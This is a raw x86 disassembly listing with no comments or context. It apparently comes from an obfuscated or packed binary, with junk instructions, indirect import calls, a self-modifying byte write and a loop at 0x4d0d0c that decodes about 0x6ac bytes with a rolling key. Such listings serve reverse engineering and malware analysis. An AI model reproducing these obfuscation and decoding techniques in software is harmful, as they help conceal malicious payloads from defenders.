  4d0771:	push   DWORD PTR [ecx+0x6c]
  4d0774:	call   0x4d07f0
  4d0779:	add    esp,0xc
  4d077c:	pop    ecx
  4d077d:	mov    ebx,0x4d201c
  4d0782:	mov    ebx,DWORD PTR [ebx]
  4d0784:	push   ebx
  4d0785:	push   DWORD PTR [ecx+0x18]
  4d0788:	pop    ebx
  4d0789:	call   ebx
  4d078b:	add    esp,0x58
  4d078e:	pop    ebp
  4d078f:	ret    
  4d0790:	mov    edi,edi
  4d0792:	push   ebp
  4d0793:	mov    ebp,esp
  4d0795:	sub    esp,0x4c
  4d0798:	lea    eax,ds:0x4d3080
  4d079e:	adc    edi,esi
  4d07a0:	push   eax
  4d07a1:	lea    ecx,[eax-0x80]
  4d07a7:	push   ecx
  4d07a8:	call   0x4d1438
  4d07ad:	add    esp,0x4
  4d07b0:	test   eax,eax
  4d07b2:	jne    0x4d07a1
  4d07b4:	pop    eax
  4d07b5:	push   eax
  4d07b6:	push   DWORD PTR [eax+0x1d8]
  4d07bc:	push   edx
  4d07bd:	call   0x4d0bf4
  4d07c2:	add    esp,0x8
  4d07c5:	pop    eax
  4d07c6:	push   eax
  4d07c7:	call   0x4d10b8
  4d07cc:	add    esp,0x4
  4d07cf:	pop    eax
  4d07d0:	add    esp,0x4c
  4d07d3:	pop    ebp
  4d07d4:	ret    
  4d07d5:	add    BYTE PTR [eax],al
  4d07d7:	add    BYTE PTR [edi-0x1],bl
  4d07da:	adc    eax,0x4d2078
  4d07df:	call   edi
  4d07e1:	add    BYTE PTR [eax],al
  4d07e3:	add    BYTE PTR [edi-0x1],bl
  4d07e6:	adc    eax,0x4d2068
  4d07eb:	call   edi
  4d07ed:	add    BYTE PTR [eax],al
  4d07ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07f5:	sub    esp,0x38
  4d07f8:	lea    ebx,[ecx-0x88]
  4d07fe:	sbb    DWORD PTR [ebp-0x24],0xffffdf6e
  4d0805:	push   0x0
  4d0807:	call   0x4d0f54
  4d080c:	add    esp,0x4
  4d080f:	push   ebx
  4d0810:	push   DWORD PTR [ebx+0xf8]
  4d0816:	push   ecx
  4d0817:	call   0x4d0a38
  4d081c:	add    esp,0x8
  4d081f:	pop    ebx
  4d0820:	push   0x0
  4d0822:	call   0x4d0884
  4d0827:	add    esp,0x4
  4d082a:	add    esp,0x38
  4d082d:	pop    ebp
  4d082e:	ret    
  4d082f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0835:	sub    esp,0x40
  4d0838:	lea    eax,[ecx-0x124]
  4d083e:	sbb    edx,DWORD PTR [eax+0x48]
  4d0841:	push   eax
  4d0842:	push   edx
  4d0843:	push   DWORD PTR [eax+0x16c]
  4d0849:	push   DWORD PTR [eax+0x144]
  4d084f:	push   DWORD PTR [eax+0x148]
  4d0855:	call   0x4d0b2c
  4d085a:	add    esp,0x10
  4d085d:	pop    eax
  4d085e:	push   eax
  4d085f:	mov    edx,0x0
  4d0864:	push   edx
  4d0865:	call   0x4d1340
  4d086a:	add    esp,0x4
  4d086d:	pop    eax
  4d086e:	push   eax
  4d086f:	mov    edi,0x0
  4d0874:	push   edi
  4d0875:	call   0x4d0b20
  4d087a:	add    esp,0x4
  4d087d:	pop    eax
  4d087e:	add    esp,0x40
  4d0881:	pop    ebp
  4d0882:	ret    
  4d0883:	add    BYTE PTR [edi-0x1],bl
  4d0886:	adc    eax,0x4d2000
  4d088b:	call   edi
  4d088d:	add    BYTE PTR [eax],al
  4d088f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0895:	sub    esp,0x30
  4d0898:	lea    ebx,ds:0x4d31ec
  4d089e:	and    DWORD PTR [ebx-0x1e0],0xffffe385
  4d08a8:	mov    edi,0x0
  4d08ad:	push   edi
  4d08ae:	call   0x4d0930
  4d08b3:	add    esp,0x4
  4d08b6:	push   ebx
  4d08b7:	push   ecx
  4d08b8:	push   DWORD PTR [ebx+0x58]
  4d08bb:	push   DWORD PTR [ebx+0xd8]
  4d08c1:	push   DWORD PTR [ebx+0x1c4]
  4d08c7:	call   0x4d156c
  4d08cc:	add    esp,0x10
  4d08cf:	pop    ebx
  4d08d0:	push   0x0
  4d08d2:	call   0x4d0e70
  4d08d7:	add    esp,0x4
  4d08da:	add    esp,0x30
  4d08dd:	pop    ebp
  4d08de:	ret    
  4d08df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e5:	sub    esp,0x4c
  4d08e8:	mov    edx,0x4d3108
  4d08ed:	add    DWORD PTR [ebp-0x34],0xffffb848
  4d08f4:	push   edx
  4d08f5:	push   0x0
  4d08f7:	call   0x4d0884
  4d08fc:	add    esp,0x4
  4d08ff:	pop    edx
  4d0900:	push   edx
  4d0901:	push   ecx
  4d0902:	push   edi
  4d0903:	call   0x4d0a9c
  4d0908:	add    esp,0x8
  4d090b:	pop    edx
  4d090c:	push   edx
  4d090d:	mov    ebx,0x0
  4d0912:	push   ebx
  4d0913:	call   0x4d0f54
  4d0918:	add    esp,0x4
  4d091b:	pop    edx
  4d091c:	add    esp,0x4c
  4d091f:	pop    ebp
  4d0920:	ret    
  4d0921:	add    BYTE PTR [eax],al
  4d0923:	add    BYTE PTR [edi-0x1],bl
  4d0926:	adc    eax,0x4d2040
  4d092b:	call   edi
  4d092d:	add    BYTE PTR [eax],al
  4d092f:	add    BYTE PTR [edi-0x1],bl
  4d0932:	adc    eax,0x4d2034
  4d0937:	call   edi
  4d0939:	add    BYTE PTR [eax],al
  4d093b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0941:	sub    esp,0x30
  4d0944:	lea    edx,[edi-0x6c]
  4d0947:	or     esi,DWORD PTR [ebp-0x28]
  4d094a:	push   edx
  4d094b:	push   0x0
  4d094d:	call   0x4d0e70
  4d0952:	add    esp,0x4
  4d0955:	pop    edx
  4d0956:	push   edx
  4d0957:	push   esi
  4d0958:	push   DWORD PTR [edx+0x74]
  4d095b:	call   0x4d1268
  4d0960:	add    esp,0x8
  4d0963:	pop    edx
  4d0964:	push   edx
  4d0965:	mov    edx,0x0
  4d096a:	push   edx
  4d096b:	call   0x4d0c3c
  4d0970:	add    esp,0x4
  4d0973:	pop    edx
  4d0974:	add    esp,0x30
  4d0977:	pop    ebp
  4d0978:	ret    
  4d0979:	add    BYTE PTR [eax],al
  4d097b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0981:	sub    esp,0x48
  4d0984:	lea    esi,ds:0x4d3010
  4d098a:	adc    DWORD PTR [ebp-0x1c],edi
  4d098d:	push   esi
  4d098e:	push   edx
  4d098f:	push   ecx
  4d0990:	call   0x4d1070
  4d0995:	add    esp,0x8
  4d0998:	pop    esi
  4d0999:	mov    eax,0x0
  4d099e:	push   eax
  4d099f:	call   0x4d06ec
  4d09a4:	add    esp,0x4
  4d09a7:	push   0xfffffff4
  4d09a9:	call   0x4d1000
  4d09ae:	add    esp,0x4
  4d09b1:	add    esp,0x48
  4d09b4:	pop    ebp
  4d09b5:	ret    
  4d09b6:	add    BYTE PTR [eax],al
  4d09b8:	pop    edi
  4d09b9:	call   DWORD PTR ds:0x4d2038
  4d09bf:	call   edi
  4d09c1:	add    BYTE PTR [eax],al
  4d09c3:	add    BYTE PTR [edi-0x1],bl
  4d09c6:	adc    eax,0x4d205c
  4d09cb:	call   edi
  4d09cd:	add    BYTE PTR [eax],al
  4d09cf:	add    BYTE PTR [edi-0x1],bl
  4d09d2:	adc    eax,0x4d20a0
  4d09d7:	call   edi
  4d09d9:	add    BYTE PTR [eax],al
  4d09db:	add    BYTE PTR [edi-0x1],bl
  4d09de:	adc    eax,0x4d2090
  4d09e3:	call   edi
  4d09e5:	add    BYTE PTR [eax],al
  4d09e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09ed:	sub    esp,0x50
  4d09f0:	mov    ecx,0x4d30b4
  4d09f5:	adc    DWORD PTR [ebp-0x2c],ecx
  4d09f8:	push   ecx
  4d09f9:	mov    eax,0x0
  4d09fe:	push   eax
  4d09ff:	call   0x4d1064
  4d0a04:	add    esp,0x4
  4d0a07:	pop    ecx
  4d0a08:	push   ecx
  4d0a09:	push   DWORD PTR [ecx+0x124]
  4d0a0f:	push   esi
  4d0a10:	push   DWORD PTR [ecx+0x5c]
  4d0a13:	call   0x4d1488
  4d0a18:	add    esp,0xc
  4d0a1b:	pop    ecx
  4d0a1c:	push   ecx
  4d0a1d:	call   0x4d0ce4
  4d0a22:	add    esp,0x4
  4d0a25:	pop    ecx
  4d0a26:	add    esp,0x50
  4d0a29:	pop    ebp
  4d0a2a:	ret    
  4d0a2b:	add    BYTE PTR [edi-0x1],bl
  4d0a2e:	adc    eax,0x4d2094
  4d0a33:	call   edi
  4d0a35:	add    BYTE PTR [eax],al
  4d0a37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a3d:	sub    esp,0x30
  4d0a40:	lea    ecx,[ebx-0xd0]
  4d0a46:	and    DWORD PTR [ecx+0x1a4],0x32ab
  4d0a50:	push   ecx
  4d0a51:	push   edx
  4d0a52:	push   DWORD PTR [ecx+0x140]
  4d0a58:	push   DWORD PTR [ecx+0xa8]
  4d0a5e:	call   0x4d14d0
  4d0a63:	add    esp,0xc
  4d0a66:	pop    ecx
  4d0a67:	push   ecx
  4d0a68:	push   0x0
  4d0a6a:	call   0x4d1340
  4d0a6f:	add    esp,0x4
  4d0a72:	pop    ecx
  4d0a73:	push   ecx
  4d0a74:	call   0x4d06f8
  4d0a79:	add    esp,0x4
  4d0a7c:	pop    ecx
  4d0a7d:	add    esp,0x30
  4d0a80:	pop    ebp
  4d0a81:	ret    
  4d0a82:	add    BYTE PTR [eax],al
  4d0a84:	pop    edi
  4d0a85:	call   DWORD PTR ds:0x4d208c
  4d0a8b:	call   edi
  4d0a8d:	add    BYTE PTR [eax],al
  4d0a8f:	add    BYTE PTR [edi-0x1],bl
  4d0a92:	adc    eax,0x4d2054
  4d0a97:	call   edi
  4d0a99:	add    BYTE PTR [eax],al
  4d0a9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aa1:	sub    esp,0x58
  4d0aa4:	mov    edi,0x4d3144
  4d0aa9:	add    esi,DWORD PTR [ebp-0x2c]
  4d0aac:	push   edi
  4d0aad:	push   DWORD PTR [edi+0x120]
  4d0ab3:	push   edx
  4d0ab4:	push   DWORD PTR [edi+0xc4]
  4d0aba:	call   0x4d0c48
  4d0abf:	add    esp,0xc
  4d0ac2:	pop    edi
  4d0ac3:	push   edi
  4d0ac4:	push   0x0
  4d0ac6:	call   0x4d0c3c
  4d0acb:	add    esp,0x4
  4d0ace:	pop    edi
  4d0acf:	push   edi
  4d0ad0:	mov    esi,0x0
  4d0ad5:	push   esi
  4d0ad6:	call   0x4d0c3c
  4d0adb:	add    esp,0x4
  4d0ade:	pop    edi
  4d0adf:	add    esp,0x58
  4d0ae2:	pop    ebp
  4d0ae3:	ret    
  4d0ae4:	mov    edi,edi
  4d0ae6:	push   ebp
  4d0ae7:	mov    ebp,esp
  4d0ae9:	sub    esp,0x48
  4d0aec:	mov    edi,0x4d30e4
  4d0af1:	sbb    edx,DWORD PTR [ebp-0x44]
  4d0af4:	push   edi
  4d0af5:	call   0x4d10b8
  4d0afa:	add    esp,0x4
  4d0afd:	pop    edi
  4d0afe:	push   edi
  4d0aff:	push   edx
  4d0b00:	push   esi
  4d0b01:	push   DWORD PTR [edi+0x194]
  4d0b07:	push   esi
  4d0b08:	call   0x4d13e4
  4d0b0d:	add    esp,0x10
  4d0b10:	pop    edi
  4d0b11:	push   edi
  4d0b12:	call   0x4d06f8
  4d0b17:	add    esp,0x4
  4d0b1a:	pop    edi
  4d0b1b:	add    esp,0x48
  4d0b1e:	pop    ebp
  4d0b1f:	ret    
  4d0b20:	pop    edi
  4d0b21:	call   DWORD PTR ds:0x4d2064
  4d0b27:	call   edi
  4d0b29:	add    BYTE PTR [eax],al
  4d0b2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b31:	sub    esp,0x34
  4d0b34:	lea    ebx,[eax+0x18c]
  4d0b3a:	or     DWORD PTR [ebp-0x10],edx
  4d0b3d:	push   ebx
  4d0b3e:	push   DWORD PTR [ebx+0xac]
  4d0b44:	push   eax
  4d0b45:	push   ecx
  4d0b46:	call   0x4d1108
  4d0b4b:	add    esp,0xc
  4d0b4e:	pop    ebx
  4d0b4f:	push   0x0
  4d0b51:	call   0x4d0930
  4d0b56:	add    esp,0x4
  4d0b59:	mov    eax,0x0
  4d0b5e:	push   eax
  4d0b5f:	call   0x4d0b20
  4d0b64:	add    esp,0x4
  4d0b67:	add    esp,0x34
  4d0b6a:	pop    ebp
  4d0b6b:	ret    
  4d0b6c:	mov    edi,edi
  4d0b6e:	push   ebp
  4d0b6f:	mov    ebp,esp
  4d0b71:	sub    esp,0x30
  4d0b74:	lea    ecx,ds:0x4d312c
  4d0b7a:	sbb    DWORD PTR [ebp-0x8],0x62
  4d0b7e:	push   ecx
  4d0b7f:	push   0xfffffff4
  4d0b81:	call   0x4d1000
  4d0b86:	add    esp,0x4
  4d0b89:	pop    ecx
  4d0b8a:	push   ecx
  4d0b8b:	push   DWORD PTR [ecx+0x1bc]
  4d0b91:	push   edx
  4d0b92:	call   0x4d0830
  4d0b97:	add    esp,0x8
  4d0b9a:	pop    ecx
  4d0b9b:	push   ecx
  4d0b9c:	push   0x0
  4d0b9e:	call   0x4d0cf0
  4d0ba3:	add    esp,0x4
  4d0ba6:	pop    ecx
  4d0ba7:	add    esp,0x30
  4d0baa:	pop    ebp
  4d0bab:	ret    
  4d0bac:	push   edi
  4d0bad:	sub    edi,edi
  4d0baf:	push   edi
  4d0bb0:	push   edi
  4d0bb1:	push   edi
  4d0bb2:	push   edi
  4d0bb3:	call   0x4d06f8
  4d0bb8:	sub    esp,0xfffffffc
  4d0bbb:	call   0x4d0c90
  4d0bc0:	push   0x2
  4d0bc2:	xor    eax,eax
  4d0bc4:	sub    eax,0x4d3030
  4d0bc9:	neg    eax
  4d0bcb:	push   0x0
  4d0bcd:	lea    ecx,[eax+0x7]
  4d0bd0:	add    BYTE PTR [ecx],0x41
  4d0bd3:	push   eax
  4d0bd4:	call   0x4d0ff4
  4d0bd9:	pop    edi
  4d0bda:	pop    edi
  4d0bdb:	pop    edi
  4d0bdc:	lea    ecx,[eax+0x3b]
  4d0bdf:	mov    edi,DWORD PTR [ecx]
  4d0be1:	lea    eax,[eax+edi*1]
  4d0be4:	mov    eax,DWORD PTR [eax+0x28]
  4d0be7:	pusha  
  4d0be8:	mov    ah,0x45
  4d0bea:	sub    al,ah
  4d0bec:	ja     0x4d074c
  4d0bf2:	popa   
  4d0bf3:	ret    
  4d0bf4:	mov    edi,edi
  4d0bf6:	push   ebp
  4d0bf7:	mov    ebp,esp
  4d0bf9:	sub    esp,0x54
  4d0bfc:	mov    edx,0x4d31f4
  4d0c01:	or     DWORD PTR [ebp-0x8],0xffffffab
  4d0c05:	push   edx
  4d0c06:	mov    esi,0x0
  4d0c0b:	push   esi
  4d0c0c:	call   0x4d0cf0
  4d0c11:	add    esp,0x4
  4d0c14:	pop    edx
  4d0c15:	push   edx
  4d0c16:	push   DWORD PTR [edx+0xb8]
  4d0c1c:	push   eax
  4d0c1d:	push   DWORD PTR [edx+0x2c]
  4d0c20:	push   edi
  4d0c21:	call   0x4d097c
  4d0c26:	add    esp,0x10
  4d0c29:	pop    edx
  4d0c2a:	push   edx
  4d0c2b:	push   0x0
  4d0c2d:	call   0x4d0930
  4d0c32:	add    esp,0x4
  4d0c35:	pop    edx
  4d0c36:	add    esp,0x54
  4d0c39:	pop    ebp
  4d0c3a:	ret    
  4d0c3b:	add    BYTE PTR [edi-0x1],bl
  4d0c3e:	adc    eax,0x4d203c
  4d0c43:	call   edi
  4d0c45:	add    BYTE PTR [eax],al
  4d0c47:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c4d:	sub    esp,0x20
  4d0c50:	lea    ecx,ds:0x4d3038
  4d0c56:	or     edi,DWORD PTR [ecx+0x144]
  4d0c5c:	push   ecx
  4d0c5d:	call   0x4d10b8
  4d0c62:	add    esp,0x4
  4d0c65:	pop    ecx
  4d0c66:	push   ecx
  4d0c67:	push   eax
  4d0c68:	push   esi
  4d0c69:	call   0x4d0e7c
  4d0c6e:	add    esp,0x8
  4d0c71:	pop    ecx
  4d0c72:	push   ecx
  4d0c73:	call   0x4d0ce4
  4d0c78:	add    esp,0x4
  4d0c7b:	pop    ecx
  4d0c7c:	add    esp,0x20
  4d0c7f:	pop    ebp
  4d0c80:	ret    
  4d0c81:	add    BYTE PTR [eax],al
  4d0c83:	add    BYTE PTR [edi-0x1],bl
  4d0c86:	adc    eax,0x4d2018
  4d0c8b:	call   edi
  4d0c8d:	add    BYTE PTR [eax],al
  4d0c8f:	add    BYTE PTR [edi-0x1],bl
  4d0c92:	adc    eax,0x4d204c
  4d0c97:	call   edi
  4d0c99:	add    BYTE PTR [eax],al
  4d0c9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ca1:	sub    esp,0x28
  4d0ca4:	mov    ecx,0x4d3100
  4d0ca9:	and    DWORD PTR [ebp-0x14],0xffffffb7
  4d0cad:	push   ecx
  4d0cae:	push   esi
  4d0caf:	push   DWORD PTR [ecx+0xc8]
  4d0cb5:	push   edi
  4d0cb6:	push   DWORD PTR [ecx+0x1a8]
  4d0cbc:	call   0x4d0ec0
  4d0cc1:	add    esp,0x10
  4d0cc4:	pop    ecx
  4d0cc5:	push   ecx
  4d0cc6:	push   0x0
  4d0cc8:	call   0x4d1340
  4d0ccd:	add    esp,0x4
  4d0cd0:	pop    ecx
  4d0cd1:	push   ecx
  4d0cd2:	push   0x0
  4d0cd4:	call   0x4d0c3c
  4d0cd9:	add    esp,0x4
  4d0cdc:	pop    ecx
  4d0cdd:	add    esp,0x28
  4d0ce0:	pop    ebp
  4d0ce1:	ret    
  4d0ce2:	add    BYTE PTR [eax],al
  4d0ce4:	pop    edi
  4d0ce5:	call   DWORD PTR ds:0x4d2030
  4d0ceb:	call   edi
  4d0ced:	add    BYTE PTR [eax],al
  4d0cef:	add    BYTE PTR [edi-0x1],bl
  4d0cf2:	adc    eax,0x4d2008
  4d0cf7:	call   edi
  4d0cf9:	add    BYTE PTR [eax],al
  4d0cfb:	add    BYTE PTR [edi-0x1],bl
  4d0cfe:	adc    eax,0x4d2014
  4d0d03:	call   edi
  4d0d05:	add    BYTE PTR [eax],al
  4d0d07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d0d:	sub    esp,0x38
  4d0d10:	add    esi,eax
  4d0d12:	lea    edi,[eax+0x88]
  4d0d18:	push   edi
  4d0d19:	mov    ebx,0x6ac
  4d0d1e:	push   ebx
  4d0d1f:	push   0x6ac
  4d0d24:	mov    edx,0x40001
  4d0d29:	push   edx
  4d0d2a:	mov    eax,0x862985c2
  4d0d2f:	push   DWORD PTR [eax+0x7a239a86]
  4d0d35:	sub    DWORD PTR [esp],0x2
  4d0d39:	mov    eax,0x4d2044
  4d0d3e:	pop    DWORD PTR [eax]
  4d0d40:	call   0x4d0ff4
  4d0d45:	add    esp,0x4
  4d0d48:	xchg   DWORD PTR [esp],eax
  4d0d4b:	mov    edi,eax
  4d0d4d:	pop    DWORD PTR [edi+0x5c]
  4d0d50:	mov    eax,DWORD PTR [edi+0x5c]
  4d0d53:	mov    ebx,eax
  4d0d55:	sub    eax,eax
  4d0d57:	dec    eax
  4d0d58:	and    eax,0x4d0014
  4d0d5d:	mov    edx,0x8d9ae218
  4d0d62:	xor    ecx,ecx
  4d0d64:	xor    esi,esi
  4d0d66:	push   DWORD PTR [eax+esi*1]
  4d0d69:	add    DWORD PTR [esp],edx
  4d0d6c:	pop    DWORD PTR [ebx+esi*2]
  4d0d6f:	dec    DWORD PTR [ebx]
  4d0d71:	xor    edx,edx
  4d0d73:	add    edx,DWORD PTR [eax]
  4d0d75:	add    eax,0x4
  4d0d78:	add    ebx,0x4
  4d0d7b:	add    ecx,0x4
  4d0d7e:	cmp    ecx,0x6ac
  4d0d84:	jne    0x4d0d64
  4d0d86:	push   edi
  4d0d87:	push   0x0
  4d0d89:	call   0x4d0e70
  4d0d8e:	add    esp,0x4
  4d0d91:	pop    edi
  4d0d92:	add    esp,0x38
  4d0d95:	pop    ebp
  4d0d96:	ret    
  4d0d97:	add    BYTE PTR [edi-0x1],bl
  4d0d9a:	adc    eax,0x4d2060
  4d0d9f:	call   edi
  4d0da1:	add    BYTE PTR [eax],al
  4d0da3:	add    BYTE PTR [edi-0x1],bl
  4d0da6:	adc    eax,0x4d2074
  4d0dab:	call   edi
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [edi-0x1],bl
  4d0db2:	adc    eax,0x4d209c
  4d0db7:	call   edi
  4d0db9:	add    BYTE PTR [eax],al
  4d0dbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dc1:	sub    esp,0x44
  4d0dc4:	lea    edx,ds:0x4d317c
  4d0dca:	mov    esi,ecx
  4d0dcc:	push   edx
  4d0dcd:	push   DWORD PTR [edx+0xa4]
  4d0dd3:	push   DWORD PTR [edx+0x70]
  4d0dd6:	push   ecx
  4d0dd7:	push   eax
  4d0dd8:	call   0x4d1194
  4d0ddd:	add    esp,0x10
  4d0de0:	pop    edx
  4d0de1:	push   edx
  4d0de2:	lea    ebx,[edx-0x17c]
  4d0de8:	push   ebx
  4d0de9:	call   0x4d1438
  4d0dee:	add    esp,0x4
  4d0df1:	test   eax,eax
  4d0df3:	jne    0x4d0de2
  4d0df5:	pop    edx
  4d0df6:	push   edx
  4d0df7:	mov    edx,0xfffffff4
  4d0dfc:	push   edx
  4d0dfd:	call   0x4d1000
  4d0e02:	add    esp,0x4
  4d0e05:	pop    edx
  4d0e06:	add    esp,0x44
  4d0e09:	pop    ebp
  4d0e0a:	ret    
  4d0e0b:	add    BYTE PTR [edi-0x1],bl
  4d0e0e:	adc    eax,0x4d2010
  4d0e13:	call   edi
  4d0e15:	add    BYTE PTR [eax],al
  4d0e17:	add    BYTE PTR [edi-0x1],bl
  4d0e1a:	adc    eax,0x4d2088
  4d0e1f:	call   edi
  4d0e21:	add    BYTE PTR [eax],al
  4d0e23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e29:	sub    esp,0x50
  4d0e2c:	lea    esi,[edi+0xcc]
  4d0e32:	adc    eax,edi
  4d0e34:	mov    ecx,0x0
  4d0e39:	push   ecx
  4d0e3a:	call   0x4d0e70
  4d0e3f:	add    esp,0x4
  4d0e42:	push   esi
  4d0e43:	push   edx
  4d0e44:	push   edi
  4d0e45:	push   DWORD PTR [esi+0x130]
  4d0e4b:	push   DWORD PTR [esi+0x88]
  4d0e51:	call   0x4d1394
  4d0e56:	add    esp,0x10
  4d0e59:	pop    esi
  4d0e5a:	mov    ebx,0xfffffff4
  4d0e5f:	push   ebx
  4d0e60:	call   0x4d1000
  4d0e65:	add    esp,0x4
  4d0e68:	add    esp,0x50
  4d0e6b:	pop    ebp
  4d0e6c:	ret    
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [edi-0x1],bl
  4d0e72:	adc    eax,0x4d2028
  4d0e77:	call   edi
  4d0e79:	add    BYTE PTR [eax],al
  4d0e7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e81:	sub    esp,0x44
  4d0e84:	mov    edx,0x4d3098
  4d0e89:	and    DWORD PTR [ebp-0x24],esi
  4d0e8c:	push   edx
  4d0e8d:	mov    esi,0x0
  4d0e92:	push   esi
  4d0e93:	call   0x4d0f54
  4d0e98:	add    esp,0x4
  4d0e9b:	pop    edx
  4d0e9c:	push   edx
  4d0e9d:	push   DWORD PTR [edx+0x8]
  4d0ea0:	push   DWORD PTR [edx+0x10c]
  4d0ea6:	call   0x4d1224
  4d0eab:	add    esp,0x8
  4d0eae:	pop    edx
  4d0eaf:	push   edx
  4d0eb0:	push   0x0
  4d0eb2:	call   0x4d0c3c
  4d0eb7:	add    esp,0x4
  4d0eba:	pop    edx
  4d0ebb:	add    esp,0x44
  4d0ebe:	pop    ebp
  4d0ebf:	ret    
  4d0ec0:	mov    edi,edi
  4d0ec2:	push   ebp
  4d0ec3:	mov    ebp,esp
  4d0ec5:	sub    esp,0x3c
  4d0ec8:	lea    eax,ds:0x4d308c
  4d0ece:	and    DWORD PTR [eax+0x11c],eax
  4d0ed4:	push   eax
  4d0ed5:	push   0x0
  4d0ed7:	call   0x4d0f54
  4d0edc:	add    esp,0x4
  4d0edf:	pop    eax
  4d0ee0:	push   eax
  4d0ee1:	push   DWORD PTR [eax+0xd8]
  4d0ee7:	push   esi
  4d0ee8:	push   DWORD PTR [eax+0xb8]
  4d0eee:	push   esi
  4d0eef:	call   0x4d0ae4
  4d0ef4:	add    esp,0x10
  4d0ef7:	pop    eax
  4d0ef8:	push   eax
  4d0ef9:	push   0x0
  4d0efb:	call   0x4d0e70
  4d0f00:	add    esp,0x4
  4d0f03:	pop    eax
  4d0f04:	add    esp,0x3c
  4d0f07:	pop    ebp
  4d0f08:	ret    
  4d0f09:	add    BYTE PTR [eax],al
  4d0f0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f11:	sub    esp,0x28
  4d0f14:	lea    edx,[edi+0xb0]
  4d0f1a:	or     DWORD PTR [ebp-0xc],edx
  4d0f1d:	push   edx
  4d0f1e:	push   eax
  4d0f1f:	push   DWORD PTR [edx+0x1fc]
  4d0f25:	call   0x4d0fb0
  4d0f2a:	add    esp,0x8
  4d0f2d:	pop    edx
  4d0f2e:	push   edx
  4d0f2f:	mov    ebx,0x0
  4d0f34:	push   ebx
  4d0f35:	call   0x4d0cf0
  4d0f3a:	add    esp,0x4
  4d0f3d:	pop    edx
  4d0f3e:	push   edx
  4d0f3f:	mov    edi,0x0
  4d0f44:	push   edi
  4d0f45:	call   0x4d0884
  4d0f4a:	add    esp,0x4
  4d0f4d:	pop    edx
  4d0f4e:	add    esp,0x28
  4d0f51:	pop    ebp
  4d0f52:	ret    
  4d0f53:	add    BYTE PTR [edi-0x1],bl
  4d0f56:	adc    eax,0x4d202c
  4d0f5b:	call   edi
  4d0f5d:	add    BYTE PTR [eax],al
  4d0f5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f65:	sub    esp,0x5c
  4d0f68:	lea    edx,[eax+0x1c]
  4d0f6b:	sbb    esi,0xffffd64e
  4d0f71:	push   edx
  4d0f72:	push   DWORD PTR [edx+0xcc]
  4d0f78:	push   DWORD PTR [edx+0x3c]
  4d0f7b:	push   DWORD PTR [edx+0x1a4]
  4d0f81:	push   DWORD PTR [edx+0xd4]
  4d0f87:	call   0x4d100c
  4d0f8c:	add    esp,0x10
  4d0f8f:	pop    edx
  4d0f90:	push   edx
  4d0f91:	mov    ecx,0x0
  4d0f96:	push   ecx
  4d0f97:	call   0x4d0c3c
  4d0f9c:	add    esp,0x4
  4d0f9f:	pop    edx
  4d0fa0:	push   edx
  4d0fa1:	call   0x4d10b8
  4d0fa6:	add    esp,0x4
  4d0fa9:	pop    edx
  4d0faa:	add    esp,0x5c
  4d0fad:	pop    ebp
  4d0fae:	ret    
  4d0faf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fb5:	sub    esp,0x48
  4d0fb8:	lea    eax,ds:0x4d308c
  4d0fbe:	cmp    eax,0x5d60
  4d0fc3:	jb     0x4d0fb3
  4d0fc5:	push   eax
  4d0fc6:	mov    edx,0x0
  4d0fcb:	push   edx
  4d0fcc:	call   0x4d0e70
  4d0fd1:	add    esp,0x4
  4d0fd4:	pop    eax
  4d0fd5:	push   eax
  4d0fd6:	push   DWORD PTR [eax+0x4c]
  4d0fd9:	push   edi
  4d0fda:	call   0x4d0f60
  4d0fdf:	add    esp,0x8
  4d0fe2:	pop    eax
  4d0fe3:	push   eax
  4d0fe4:	call   0x4d10b8
  4d0fe9:	add    esp,0x4
  4d0fec:	pop    eax
  4d0fed:	add    esp,0x48
  4d0ff0:	pop    ebp
  4d0ff1:	ret    
  4d0ff2:	add    BYTE PTR [eax],al
  4d0ff4:	pop    edi
  4d0ff5:	call   DWORD PTR ds:0x4d2044
  4d0ffb:	call   edi
  4d0ffd:	add    BYTE PTR [eax],al
  4d0fff:	add    BYTE PTR [edi-0x1],bl
  4d1002:	adc    eax,0x4d2024
  4d1007:	call   edi
  4d1009:	add    BYTE PTR [eax],al
  4d100b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1011:	sub    esp,0x5c
  4d1014:	lea    edi,ds:0x4d308c
  4d101a:	sbb    esi,0xffffffc7
  4d101d:	push   edi
  4d101e:	mov    ecx,0x0
  4d1023:	push   ecx
  4d1024:	call   0x4d0c3c
  4d1029:	add    esp,0x4
  4d102c:	pop    edi
  4d102d:	push   edi
  4d102e:	push   esi
  4d102f:	push   ebx
  4d1030:	push   eax
  4d1031:	push   esi
  4d1032:	call   0x4d11e8
  4d1037:	add    esp,0x10
  4d103a:	pop    edi
  4d103b:	push   edi
  4d103c:	push   0x0
  4d103e:	call   0x4d0884
  4d1043:	add    esp,0x4
  4d1046:	pop    edi
  4d1047:	add    esp,0x5c
  4d104a:	pop    ebp
  4d104b:	ret    
  4d104c:	pop    edi
  4d104d:	call   DWORD PTR ds:0x4d2080
  4d1053:	call   edi
  4d1055:	add    BYTE PTR [eax],al
  4d1057:	add    BYTE PTR [edi-0x1],bl
  4d105a:	adc    eax,0x4d2048
  4d105f:	call   edi
  4d1061:	add    BYTE PTR [eax],al
  4d1063:	add    BYTE PTR [edi-0x1],bl
  4d1066:	adc    eax,0x4d2070
  4d106b:	call   edi
  4d106d:	add    BYTE PTR [eax],al
  4d106f:	add    BYTE PTR [ebx-0x1374aa01],cl
